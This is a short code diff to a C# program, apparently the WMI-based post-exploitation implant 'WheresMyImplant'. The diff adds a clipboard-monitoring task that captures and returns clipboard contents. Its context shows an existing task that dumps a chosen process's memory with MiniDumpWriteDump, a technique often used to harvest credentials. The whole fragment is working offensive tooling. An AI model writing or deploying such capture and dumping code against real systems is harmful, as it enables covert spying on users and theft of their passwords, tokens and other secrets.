@@ -1,6 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Management.Instrumentation;
 using System.Text;
 
@@ -134,6 +132,25 @@ namespace WheresMyImplant
             MiniDumpWriteDump miniDump = new MiniDumpWriteDump();
             miniDump.CreateMiniDump((UInt32)pid, fileName);
             output.Append(miniDump.GetOutput());
+            return output.ToString();
+        }
+
+        [ManagementTask]
+        public static String Clipboard()
+        {
+            StringBuilder output = new StringBuilder();
+            try
+            {
+                using (Clipboard clippy = new Clipboard())
+                {
+                    clippy.Monitor();
+                    output.Append(clippy.GetOutput());
+                }
+            }
+            catch (Exception ex)
+            {
+                output.Append(ex.ToString());
+            }
             return output.ToString();
         }
 
